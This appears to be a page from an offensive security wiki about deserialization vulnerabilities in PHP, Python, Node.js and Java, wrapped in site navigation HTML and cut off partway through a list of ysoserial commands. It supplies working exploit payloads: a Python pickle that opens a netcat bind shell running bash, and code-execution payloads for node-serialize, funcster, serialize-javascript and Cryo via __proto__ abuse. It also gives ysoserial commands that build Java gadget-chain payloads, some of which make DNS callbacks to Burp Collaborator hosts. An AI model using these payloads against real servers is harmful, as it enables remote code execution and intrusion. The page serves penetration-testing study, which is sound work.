        <li class="chapter " data-level="16.12" data-path="../../general/phising-documents.html">
            
                <a href="../../general/phising-documents.html">
            
                    
                    Phising Documents
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="16.13" data-path="../../general/reset-password.html">
            
                <a href="../../general/reset-password.html">
            
                    
                    Reset/Forgoten Password Bypass
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="16.14" data-path="../../general/stealing-sensitive-information-disclosure-from-a-web.html">
            
                <a href="../../general/stealing-sensitive-information-disclosure-from-a-web.html">
            
                    
                    Stealing Sensitive Information Disclosure from a Web
            
                </a>
            

            
        </li>
    

    

    <li class="divider"></li>

    <li>
        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
            Published with GitBook
        </a>
    </li>
</ul>


                </nav>
            
        
    </div>

    <div class="book-body">
        
            <div class="body-inner">
                
                    

<div class="book-header" role="navigation">
    

    <!-- Title -->
    <h1>
        <i class="fa fa-circle-o-notch fa-spin"></i>
        <a href="../.." >Deserialization</a>
    </h1>
</div>




                    <div class="page-wrapper" tabindex="-1" role="main">
                        <div class="page-inner">
                            
<div id="book-search-results">
    <div class="search-noresults">
    
                                <section class="normal markdown-section">
                                
                                <h1 id="deserialization">Deserialization</h1>
<p><strong>Serialization</strong> is the process of turning some object into a data format that can be restored later. People often serialize objects in order to save them to storage, or to send as part of communications.</p>
<p><strong>Deserialization</strong> is the reverse of that process, taking data structured from some format, and rebuilding it into an object. Today, the most popular data format for serializing data is JSON. Before that, it was XML.</p>
<p>In many occasions you can find some code in the server side that unserialize some object given by the user.<br>In this case, you can send a malicious payload to make the server side behave unexpectedly.</p>
<p><strong>You should read:</strong> <a href="https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html" target="_blank"><strong>https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html</strong></a> <strong>for learn how to attack.</strong></p>
<h2 id="php">PHP</h2>
<p>Magic method used with serialization:</p>
<ul>
<li><code>__sleep</code> is called when an object is serialized and must be returned to array</li>
</ul>
<p>Magic method used with deserialization</p>
<ul>
<li><code>__wakeup</code> is called when an object is deserialized. </li>
<li><code>__destruct</code> is called when PHP script end and object is destroyed. </li>
<li><code>__toString</code> uses object as string but also can be used to read file or more than that based on function call inside it.</li>
</ul>
<pre><code class="lang-php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span> </span>{
    <span class="hljs-keyword">public</span> $s = <span class="hljs-string">&quot;This is a test&quot;</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">displaystring</span><span class="hljs-params">()</span></span>{
        <span class="hljs-keyword">echo</span> $this-&gt;s.<span class="hljs-string">&apos;&lt;br /&gt;&apos;</span>;
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span><span class="hljs-params">()</span>
    </span>{
        <span class="hljs-keyword">echo</span> <span class="hljs-string">&apos;__toString method called&apos;</span>;
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">()</span></span>{
        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__construct method called&quot;</span>;
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span></span>{
        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__destruct method called&quot;</span>;
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span><span class="hljs-params">()</span></span>{
        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__wakeup method called&quot;</span>;
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__sleep</span><span class="hljs-params">()</span></span>{
        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__sleep method called&quot;</span>;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;s&quot;</span>); <span class="hljs-comment">#The &quot;s&quot; makes references to the public attribute</span>
    }
}

$o = <span class="hljs-keyword">new</span> test();
$o-&gt;displaystring();
$ser=serialize($o);
<span class="hljs-keyword">echo</span> $ser;
$unser=unserialize($ser);
$unser-&gt;displaystring();

<span class="hljs-comment">/*
php &gt; $o = new test();
__construct method called__destruct method called
php &gt; $o-&gt;displaystring();
This is a test&lt;br /&gt;
php &gt; $ser=serialize($o);
__sleep method called
php &gt; echo $ser;
O:4:&quot;test&quot;:1:{s:1:&quot;s&quot;;s:14:&quot;This is a test&quot;;}
php &gt; $unser=unserialize($ser);
__wakeup method called__destruct method called
php &gt; $unser-&gt;displaystring();
This is a test&lt;br /&gt;
*/</span>
<span class="hljs-meta">?&gt;</span>
</code></pre>
<p>If you look to the results you can see that the functions <code>__wakeup</code> and <code>__destruct</code> are called when the object is deserialized. Note that in several tutorials you will find that the <code>__toString</code> function is called when trying yo print some attribute, but apparently that&apos;s <strong>not happening anymore</strong>.</p>
<p><a href="https://www.php.net/manual/en/language.oop5.autoload.php" target="_blank"><strong>Autoload Classes</strong></a> may also be <strong>dangerous</strong>.</p>
<p>You can read an explained <strong>PHP example here</strong>: <a href="https://www.notsosecure.com/remote-code-execution-via-php-unserialize/" target="_blank">https://www.notsosecure.com/remote-code-execution-via-php-unserialize/</a>, here <a href="https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf" target="_blank">https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf</a> or here <a href="https://securitycafe.ro/2015/01/05/understanding-php-object-injection/" target="_blank">https://securitycafe.ro/2015/01/05/understanding-php-object-injection/</a></p>
<h2 id="python">Python</h2>
<h3 id="pickle"><strong>Pickle</strong></h3>
<p>When the object gets unpickle, the function <em>\</em>_reduce___ will be executed.<br>When exploited, server could return an error.</p>
<pre><code class="lang-python"><span class="hljs-keyword">import</span> cPickle, os, base64
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">P</span><span class="hljs-params">(object)</span>:</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__reduce__</span><span class="hljs-params">(self)</span>:</span>
        <span class="hljs-keyword">return</span> (os.system,(<span class="hljs-string">&quot;netcat -c &apos;/bin/bash -i&apos; -l -p 1234 &quot;</span>,))
print(base64.b64encode(cPickle.dumps(P())))
</code></pre>
<h2 id="nodejs">NodeJS</h2>
<h3 id="node-serialize"><a href="https://www.npmjs.com/package/node-serialize" target="_blank">node-serialize</a></h3>
<p>This library allows to serialise functions. Example:</p>
<pre><code class="lang-javascript"><span class="hljs-keyword">var</span> y = {
 <span class="hljs-string">&quot;rce&quot;</span>: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>{ <span class="hljs-built_in">require</span>(<span class="hljs-string">&apos;child_process&apos;</span>).exec(<span class="hljs-string">&apos;ls /&apos;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">error, stdout, stderr</span>) </span>{ <span class="hljs-built_in">console</span>.log(stdout) })},
}
<span class="hljs-keyword">var</span> serialize = <span class="hljs-built_in">require</span>(<span class="hljs-string">&apos;node-serialize&apos;</span>);
<span class="hljs-keyword">var</span> payload_serialized = serialize.serialize(y);
<span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;Serialized: \n&quot;</span> + payload_serialized);
</code></pre>
<p>The <strong>serialised object</strong> will looks like:</p>
<pre><code class="lang-bash">{<span class="hljs-string">&quot;rce&quot;</span>:<span class="hljs-string">&quot;_$<span class="hljs-variable">$ND_FUNC</span>$<span class="hljs-variable">$_function</span>(){ require(&apos;child_process&apos;).exec(&apos;ls /&apos;, function(error, stdout, stderr) { console.log(stdout) })}&quot;</span>}
</code></pre>
<p>You can see in the example that when a function is serialized the <code>_$$ND_FUNC$$_</code> flag is appended to the serialized object.</p>
<p>Inside the file <code>node-serialize/lib/serialize.js</code> you can find the same flag and how the code is using it.</p>
<p><img src="../../.gitbook/assets/image%20%2898%29.png" alt=""></p>
<p><img src="../../.gitbook/assets/image%20%2891%29.png" alt=""></p>
<p>As you may see in the last chunk of code, <strong>if the flag is found</strong> <code>eval</code> is used to deserialize the function, so basically <strong>user input if being used inside the <code>eval</code> function</strong>.</p>
<p>However, <strong>just serialising</strong> a function <strong>won&apos;t execute it</strong> as it would be necessary that some part of the code is <strong>calling <code>y.rce</code></strong> in our example and that&apos;s highly <strong>unlikable</strong>.<br>Anyway, you could just <strong>modify the serialised object</strong> <strong>adding some parenthesis</strong> in order to auto execute the serialized function when the object is deserialized.<br>In the next chunk of code <strong>notice the last parenthesis</strong> and how the <code>unserialize</code> function will automatically execute the code:</p>
<pre><code class="lang-javascript"><span class="hljs-keyword">var</span> serialize = <span class="hljs-built_in">require</span>(<span class="hljs-string">&apos;node-serialize&apos;</span>);
<span class="hljs-keyword">var</span> test = {<span class="hljs-string">&quot;rce&quot;</span>:<span class="hljs-string">&quot;_$$ND_FUNC$$_function(){ require(&apos;child_process&apos;).exec(&apos;ls /&apos;, function(error, stdout, stderr) { console.log(stdout) }); }()&quot;</span>};
serialize.unserialize(test);
</code></pre>
<p>As it was previously indicated, this library will get the code after<code>_$$ND_FUNC$$_</code> and will <strong>execute it</strong> using <code>eval</code>. Therefore, in order to <strong>auto-execute code</strong> you can <strong>delete the function creation</strong> part and the last parenthesis and <strong>just execute a JS oneliner</strong> like in the following example:</p>
<pre><code class="lang-javascript"><span class="hljs-keyword">var</span> serialize = <span class="hljs-built_in">require</span>(<span class="hljs-string">&apos;node-serialize&apos;</span>);
<span class="hljs-keyword">var</span> test = <span class="hljs-string">&apos;{&quot;rce&quot;:&quot;_$$ND_FUNC$$_require(\&apos;child_process\&apos;).exec(\&apos;ls /\&apos;, function(error, stdout, stderr) { console.log(stdout) })&quot;}&apos;</span>;
serialize.unserialize(test);
</code></pre>
<p>You can <strong>**[</strong>find here<strong>](<a href="https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/" target="_blank">https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/</a>) </strong>further information** about how to exploit this vulnerability.</p>
<h3 id="funcster"><a href="https://www.npmjs.com/package/funcster" target="_blank">funcster</a></h3>
<p>The interesting difference here is that the <strong>standard built-in objects are not accessible</strong>, because they are out of scope. It means that we can execute our code, but cannot call build-in objects&#x2019; methods. So if we use <code>console.log()</code> or <code>require(something)</code>, Node returns an exception like <code>&quot;ReferenceError: console is not defined&quot;</code>.</p>
<p>However, we can easily can get back access to everything because we still have access to the global context using something like  <code>this.constructor.constructor(&quot;console.log(1111)&quot;)();</code>:</p>
<pre><code class="lang-javascript">funcster = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;funcster&quot;</span>);
<span class="hljs-comment">//Serialization</span>
<span class="hljs-keyword">var</span> test = funcster.serialize(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>{ <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello world!&quot;</span> })
<span class="hljs-built_in">console</span>.log(test) <span class="hljs-comment">// { __js_function: &apos;function(){return&quot;Hello world!&quot;}&apos; }</span>

<span class="hljs-comment">//Deserialization with auto-execution</span>
<span class="hljs-keyword">var</span> desertest1 = { __js_function: <span class="hljs-string">&apos;function(){return &quot;Hello world!&quot;}()&apos;</span> }
funcster.deepDeserialize(desertest1)
<span class="hljs-keyword">var</span> desertest2 = { __js_function: <span class="hljs-string">&apos;this.constructor.constructor(&quot;console.log(1111)&quot;)()&apos;</span> }
funcster.deepDeserialize(desertest2)
<span class="hljs-keyword">var</span> desertest3 = { __js_function: <span class="hljs-string">&apos;this.constructor.constructor(&quot;require(\&apos;child_process\&apos;).exec(\&apos;ls /\&apos;, function(error, stdout, stderr) { console.log(stdout) });&quot;)()&apos;</span> }
funcster.deepDeserialize(desertest3)
</code></pre>
<p><strong>For</strong><a href="https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/" target="_blank"> <strong>more information read this page</strong></a><strong>.</strong></p>
<h3 id="serialize-javascript">****<a href="https://www.npmjs.com/package/serialize-javascript" target="_blank"><strong>serialize-javascript</strong></a>****</h3>
<p>The package <strong>doesn&#x2019;t include any deserialization functionalit</strong>y and requires you to implement it yourself. Their example uses <code>eval</code> directly. This is the official deserialisation example:</p>
<pre><code class="lang-javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">deserialize</span>(<span class="hljs-params">serializedJavascript</span>)</span>{
  <span class="hljs-keyword">return</span> <span class="hljs-built_in">eval</span>(<span class="hljs-string">&apos;(&apos;</span> + serializedJavascript + <span class="hljs-string">&apos;)&apos;</span>);
}
</code></pre>
<p>If this function is used to deserialize objects you can <strong>easily exploit it</strong>:</p>
<pre><code class="lang-javascript"><span class="hljs-keyword">var</span> serialize = <span class="hljs-built_in">require</span>(<span class="hljs-string">&apos;serialize-javascript&apos;</span>);
<span class="hljs-comment">//Serialization</span>
<span class="hljs-keyword">var</span> test = serialize(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>{ <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello world!&quot;</span> });
<span class="hljs-built_in">console</span>.log(test) <span class="hljs-comment">//function() { return &quot;Hello world!&quot; }</span>

<span class="hljs-comment">//Deserialization</span>
<span class="hljs-keyword">var</span> test = <span class="hljs-string">&quot;function(){ require(&apos;child_process&apos;).exec(&apos;ls /&apos;, function(error, stdout, stderr) { console.log(stdout) }); }()&quot;</span>
deserialize(test)
</code></pre>
<h3 id="proto-abuse">__proto__ abuse</h3>
<p><em><strong>(This information was taken from</strong></em> <a href="https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/" target="_blank"><em><strong>here</strong></em> </a><em><strong>and</strong></em> <a href="https://hackerone.com/reports/350418" target="_blank"><em><strong>here</strong></em></a><em><strong>).</strong></em></p>
<p><strong>Another way</strong> to achieve code execution is leveraging in <strong>functions</strong> with <strong>attacker&#x2019;s controlled</strong> data which are <strong>called automatically</strong> <strong>during</strong> the <strong>deserialization</strong> process or after when an application interacts with a newly created object. Something similar to &#x201C;magic methods&#x201D; in other languages.</p>
<p>Many packages use the next approach in the deserialization process. They create an empty object and then set its properties using square brackets notations:</p>
<pre><code class="lang-javascript">obj[key]=value
</code></pre>
<p>Secondly, a call of some function leads to the invoking of the function arguments&#x2019; methods. For example, when an object is converted to a string, then methods valueOf, toString of the object are called automatically (more details <a href="http://2ality.com/2012/03/converting-to-string.html" target="_blank">here</a>). So, <code>console.log(obj)</code> leads to invocation of <code>obj.toString()</code>. Another example, <code>JSON.stringify(obj)</code> internally invokes obj.toJSON().</p>
<p>Abusing the  <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/proto" target="_blank">__proto__ property </a>you can <strong>change the methods of the object</strong>, for example <code>obj.valueOf</code> or <code>obj.toString</code>. So, if you can modify the <code>__proto__</code> property of an object you can modify the behaviour of the object when a method is call: you could make it execute arbitrary code whenever <code>obj.toString</code> is called. Keep in mind that the <strong>execution</strong> of several <strong>methods</strong> are very <strong>common</strong>, for example <code>console.log(obj + &quot;anything&quot;)</code> will execute <code>obj.toString</code>, or  <code>JSON.stringify(obj)</code> internally invokes <code>obj.toJSON()</code>.</p>
<p>I&#x2019;ve found a nice example &#x2013; <a href="https://www.npmjs.com/package/cryo" target="_blank">package Cryo</a>, which supports both function serialization and square bracket notation for object reconstruction, but which isn&#x2019;t vulnerable to IIFE, because it properly manages object (without using <code>eval&amp;co</code>).</p>
<p>Here a code for serialization and deserialization of an object:</p>
<pre><code class="lang-javascript">cvar Cryo = <span class="hljs-built_in">require</span>(<span class="hljs-string">&apos;cryo&apos;</span>);
<span class="hljs-keyword">var</span> obj = {
testFunc : <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>{<span class="hljs-keyword">return</span> <span class="hljs-number">1111</span>;}
};

<span class="hljs-keyword">var</span> frozen = Cryo.stringify(obj);
<span class="hljs-built_in">console</span>.log(frozen)

<span class="hljs-keyword">var</span> hydrated = Cryo.parse(frozen);
<span class="hljs-built_in">console</span>.log(hydrated);
</code></pre>
<p>Abusing <code>__proto__</code> property to modify the behaviour of the object when calling <code>toString</code> and <code>valueOf</code> (Note that you need to modify the <strong>serialized object</strong> from <code>__proto</code> to <code>__proto__</code>  to abuse the deserialization):</p>
<pre><code class="lang-javascript"><span class="hljs-comment">// Simple deserialization executing a console.log</span>
<span class="hljs-keyword">var</span> obj = {
    __proto: {
        toString: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>{<span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;defconrussia&quot;</span>); <span class="hljs-keyword">return</span> <span class="hljs-number">1111</span>;},
        valueOf: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>{<span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;defconrussia&quot;</span>); <span class="hljs-keyword">return</span> <span class="hljs-number">2222</span>;}
    }
};
<span class="hljs-keyword">var</span> sertest = Cryo.stringify(obj);
sertest <span class="hljs-comment">//&apos;{&quot;root&quot;:&quot;_CRYO_REF_3&quot;,&quot;references&quot;:[{&quot;contents&quot;:{},&quot;value&quot;:&quot;_CRYO_FUNCTION_function() {console.log(\\&quot;defconrussia\\&quot;); return 1111;}&quot;},{&quot;contents&quot;:{},&quot;value&quot;:&quot;_CRYO_FUNCTION_function() {console.log(\\&quot;defconrussia\\&quot;); return 2222;}&quot;},{&quot;contents&quot;:{&quot;toString&quot;:&quot;_CRYO_REF_0&quot;,&quot;valueOf&quot;:&quot;_CRYO_REF_1&quot;},&quot;value&quot;:&quot;_CRYO_OBJECT_&quot;},{&quot;contents&quot;:{&quot;__proto&quot;:&quot;_CRYO_REF_2&quot;},&quot;value&quot;:&quot;_CRYO_OBJECT_&quot;}]}&apos;</span>

<span class="hljs-keyword">var</span> destest = <span class="hljs-string">&apos;{&quot;root&quot;:&quot;_CRYO_REF_3&quot;,&quot;references&quot;:[{&quot;contents&quot;:{},&quot;value&quot;:&quot;_CRYO_FUNCTION_function() {console.log(\\&quot;defconrussia\\&quot;); return 1111;}&quot;},{&quot;contents&quot;:{},&quot;value&quot;:&quot;_CRYO_FUNCTION_function() {console.log(\\&quot;defconrussia\\&quot;); return 2222;}&quot;},{&quot;contents&quot;:{&quot;toString&quot;:&quot;_CRYO_REF_0&quot;,&quot;valueOf&quot;:&quot;_CRYO_REF_1&quot;},&quot;value&quot;:&quot;_CRYO_OBJECT_&quot;},{&quot;contents&quot;:{&quot;__proto__&quot;:&quot;_CRYO_REF_2&quot;},&quot;value&quot;:&quot;_CRYO_OBJECT_&quot;}]}&apos;</span>
<span class="hljs-keyword">var</span> destestdone = Cryo.parse(destest);
<span class="hljs-built_in">console</span>.log(destestdone + <span class="hljs-string">&quot;anything&quot;</span>);


<span class="hljs-comment">// Deserialization with RCE</span>
<span class="hljs-keyword">var</span> obj = {
    __proto: {
        toString: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>{ <span class="hljs-built_in">require</span>(<span class="hljs-string">&apos;child_process&apos;</span>).exec(<span class="hljs-string">&apos;ls /&apos;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">error, stdout, stderr</span>) </span>{ <span class="hljs-built_in">console</span>.log(stdout) }); },
        valueOf: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>{ <span class="hljs-built_in">require</span>(<span class="hljs-string">&apos;child_process&apos;</span>).exec(<span class="hljs-string">&apos;ls /&apos;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">error, stdout, stderr</span>) </span>{ <span class="hljs-built_in">console</span>.log(stdout) }); }
    }
};
<span class="hljs-keyword">var</span> sertest = Cryo.stringify(obj);
sertest <span class="hljs-comment">//&apos;{&quot;root&quot;:&quot;_CRYO_REF_3&quot;,&quot;references&quot;:[{&quot;contents&quot;:{},&quot;value&quot;:&quot;_CRYO_FUNCTION_function() {console.log(\\&quot;defconrussia\\&quot;); return 1111;}&quot;},{&quot;contents&quot;:{},&quot;value&quot;:&quot;_CRYO_FUNCTION_function() {console.log(\\&quot;defconrussia\\&quot;); return 2222;}&quot;},{&quot;contents&quot;:{&quot;toString&quot;:&quot;_CRYO_REF_0&quot;,&quot;valueOf&quot;:&quot;_CRYO_REF_1&quot;},&quot;value&quot;:&quot;_CRYO_OBJECT_&quot;},{&quot;contents&quot;:{&quot;__proto&quot;:&quot;_CRYO_REF_2&quot;},&quot;value&quot;:&quot;_CRYO_OBJECT_&quot;}]}&apos;</span>

<span class="hljs-keyword">var</span> destest = <span class="hljs-string">&apos;{&quot;root&quot;:&quot;_CRYO_REF_3&quot;,&quot;references&quot;:[{&quot;contents&quot;:{},&quot;value&quot;:&quot;_CRYO_FUNCTION_function(){ require(\&apos;child_process\&apos;).exec(\&apos;ls /\&apos;, function(error, stdout, stderr) { console.log(stdout) }); }&quot;},{&quot;contents&quot;:{},&quot;value&quot;:&quot;_CRYO_FUNCTION_function(){ require(\&apos;child_process\&apos;).exec(\&apos;ls /\&apos;, function(error, stdout, stderr) { console.log(stdout) }); }&quot;},{&quot;contents&quot;:{&quot;toString&quot;:&quot;_CRYO_REF_0&quot;,&quot;valueOf&quot;:&quot;_CRYO_REF_1&quot;},&quot;value&quot;:&quot;_CRYO_OBJECT_&quot;},{&quot;contents&quot;:{&quot;__proto__&quot;:&quot;_CRYO_REF_2&quot;},&quot;value&quot;:&quot;_CRYO_OBJECT_&quot;}]}&apos;</span>
<span class="hljs-keyword">var</span> destestdone = Cryo.parse(destest);
<span class="hljs-built_in">console</span>.log(destestdone + <span class="hljs-string">&quot;anything&quot;</span>);
</code></pre>
<h2 id="java---http">Java - HTTP</h2>
<p>The main problem with deserialized objects in Java is that <strong>deserialization callbacks were invoked during deserialization</strong>. This makes possible for an <strong>attacker</strong> to <strong>take advantage of that callbacks</strong> and prepare a payload that abuses the callbacks to <strong>perform malicious actions</strong>.</p>
<h3 id="fingerprints">Fingerprints</h3>
<h4 id="white-box">White Box</h4>
<p>Search inside the code for serialization classes and function. For example, search for classes implementing <code>Serializable</code> , the use of <code>java.io.ObjectInputStream</code> <strong>or <code>readObject</code> </strong>or <code>readUnshare</code> functions<em>.</em></p>
<p>You should also keep an eye on:</p>
<ul>
<li><code>XMLdecoder</code> with external user defined parameters</li>
<li><code>XStream</code> with <code>fromXML</code> method (xstream version &lt;= v1.46 is vulnerable to the serialization issue)</li>
<li><code>ObjectInputStream</code> with <code>readObject</code></li>
<li>Uses of <code>readObject</code>, <code>readObjectNodData</code>, <code>readResolve</code> or <code>readExternal</code></li>
<li><code>ObjectInputStream.readUnshared</code></li>
<li><code>Serializable</code></li>
</ul>
<h4 id="black-box">Black Box</h4>
<p><strong>Fingerprints/Magic Bytes</strong> of <strong>java serialised</strong> objects (from <code>ObjectInputStream</code>):</p>
<ul>
<li><code>AC ED 00 05</code> in Hex</li>
<li><code>rO0</code> in Base64</li>
<li><code>Content-type</code> header of an HTTP response set to <code>application/x-java-serialized-object</code></li>
<li><code>1F 8B 08 00</code>  Hex previously compressed</li>
<li><code>H4sIA</code> Base64 previously compressed</li>
<li>Web files with extension <code>.faces</code> and <code>faces.ViewState</code> parameter. If you find this in a wabapp, take a look to the <a href="java-jsf-viewstate-.faces-deserialization.html"><strong>post about Java JSF VewState Deserialization</strong></a>.</li>
</ul>
<pre><code class="lang-text">javax.faces.ViewState=rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwdAAML2xvZ2luLnhodG1s
</code></pre>
<h3 id="check-if-vulnerable">Check if vulnerable</h3>
<p>If you want to <strong>learn about how does a Java Deserialized exploit work</strong> you should take a look to <a href="basic-java-deserialization-objectinputstream-readobject.html"><strong>Basic Java Deserialization</strong></a>, <a href="java-dns-deserialization-and-gadgetprobe.html"><strong>Java DNS Deserialization</strong></a>, and <a href="java-transformers-to-rutime-exec-payload.html"><strong>CommonsCollection1 Payload</strong></a>.</p>
<h4 id="white-box-test">White Box Test</h4>
<p>You can check if there is installed any application with known vulnerabilities.</p>
<pre><code class="lang-bash">find . -iname <span class="hljs-string">&quot;*commons*collection*&quot;</span>
grep -R InvokeTransformer .
</code></pre>
<p>You could try to <strong>check all the libraries</strong> known to be vulnerable and that <strong>**[</strong>Ysoserial<strong> ](<a href="https://github.com/frohoff/ysoserial)can" target="_blank">https://github.com/frohoff/ysoserial)can</a> provide an exploit for. Or you could check the libraries indicated on <a href="https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#genson-json" target="_blank">Java-Deserialization-Cheat-Sheet</a>.<br>You could also use **</strong><a href="https://github.com/JackOfMostTrades/gadgetinspector" target="_blank"><strong>gadgetinspector</strong></a> to search for possible gadget chains that can be exploited.<br>When running <strong>gadgetinspector</strong> (after building it) don&apos;t care about the tons of warnings/errors that it&apos;s going through and let it finish. It will write all the findings under <em>gadgetinspector/gadget-results/gadget-chains-year-month-day-hore-min.txt</em>. Please, notice that <strong>gadgetinspector won&apos;t create an exploit and it may indicate false positives</strong>.</p>
<h4 id="black-box-test">Black Box Test</h4>
<p>Using the Burp extension <a href="java-dns-deserialization-and-gadgetprobe.html"><strong>gadgetprobe</strong></a> you can identify <strong>which libraries are available</strong> (and even the versions). With this information it could be <strong>easier to choose a payload</strong> to exploit the vulnerability.<br><a href="java-dns-deserialization-and-gadgetprobe.html#gadgetprobe"><strong>Read this to learn more about GadgetProbe</strong></a><strong>.</strong><br>GadgetProbe is focused on <strong><code>ObjectInputStream</code></strong> deserializations<strong>.</strong></p>
<p>Using Burp extension <a href="java-dns-deserialization-and-gadgetprobe.html#java-deserialization-scanner"><strong>Java Deserialization Scanner</strong></a> you can <strong>identify vulnerable libraries</strong> exploitable with ysoserial and <strong>exploit</strong> them.<br><a href="java-dns-deserialization-and-gadgetprobe.html#java-deserialization-scanner"><strong>Read this to learn more about Java Deserialization Scanner.</strong></a><br><strong>**Java Deserialization Scanner is focused on </strong><code>ObjectInputStream</code>** deserializations.</p>
<p>You can also use <a href="https://github.com/nccgroup/freddy" target="_blank"><strong>Freddy</strong></a> to <strong>detect deserializations</strong> vulnerabilities in <strong>Burp</strong>. This plugin will detect <strong>not only <code>ObjectInputStream</code></strong>related vulnerabilities but <strong>also</strong> vulns from <strong>Json</strong> an <strong>Yml</strong> deserialization libraries. In active mode, it will try to confirm them using sleep or DNS payloads.<br><a href="https://www.nccgroup.com/us/about-us/newsroom-and-events/blog/2018/june/finding-deserialisation-issues-has-never-been-easier-freddy-the-serialisation-killer/" target="_blank"><strong>You can find more information about Freddy here.</strong></a>****</p>
<p><strong>Serialization Test</strong></p>
<p>Not all is about checking if any vulnerable library is used by the server. Sometimes you could be able to <strong>change the data inside the serialized object and bypass some checks</strong> (maybe grant you admin privileges inside a webapp).<br>If you find a java serialized object being sent to a web application, <strong>you can use</strong> <a href="https://github.com/NickstaDB/SerializationDumper" target="_blank"><strong>SerializationDumper</strong></a> <strong>to print in a more human readable format the serialization object that is sent</strong>. Knowing which data are you sending would be easier to modify it and bypass some checks.</p>
<h3 id="exploit"><strong>Exploit</strong></h3>
<h4 id="ysoserial"><strong>ysoserial</strong></h4>
<p>The most well-known tool to exploit HTTP deserializations is <strong>**[</strong>ysoserial<strong>](<a href="https://github.com/frohoff/ysoserial" target="_blank">https://github.com/frohoff/ysoserial</a>) ([</strong>download here<strong>](<a href="https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)\" target="_blank">https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)\</a>).<br>**</strong>Note that this tool is <strong>focused</strong> on exploiting <strong><code>ObjectInputStream</code></strong>.<br>I would <strong>start using the &quot;URLDNS&quot;</strong> payload <strong>before a RCE</strong> payload to test if the injection is possible. Anyway, note that maybe the &quot;URLDNS&quot; payload is not working but other RCE payload is.</p>
<pre><code class="lang-bash"><span class="hljs-comment"># PoC to make the application perform a DNS req</span>
java -jar ysoserial-master-SNAPSHOT.jar URLDNS http://b7j40108s43ysmdpplgd3b7rdij87x.burpcollaborator.net &gt; payload

<span class="hljs-comment"># PoC RCE in Windows</span>
<span class="hljs-comment">## Ping</span>
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections5 <span class="hljs-string">&apos;cmd /c ping -n 5 127.0.0.1&apos;</span> &gt; payload
<span class="hljs-comment">## Time, I noticed the response too longer when this was used</span>
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 <span class="hljs-string">&quot;cmd /c timeout 5&quot;</span> &gt; payload
<span class="hljs-comment">## Create File</span>
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 <span class="hljs-string">&quot;cmd /c echo pwned&gt; C:\\\\Users\\\\username\\\\pwn&quot;</span> &gt; payload
<span class="hljs-comment">## DNS request</span>
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 <span class="hljs-string">&quot;cmd /c nslookup jvikwa34jwgftvoxdz16jhpufllb90.burpcollaborator.net&quot;</span>
<span class="hljs-comment">## HTTP request (+DNS)</span>
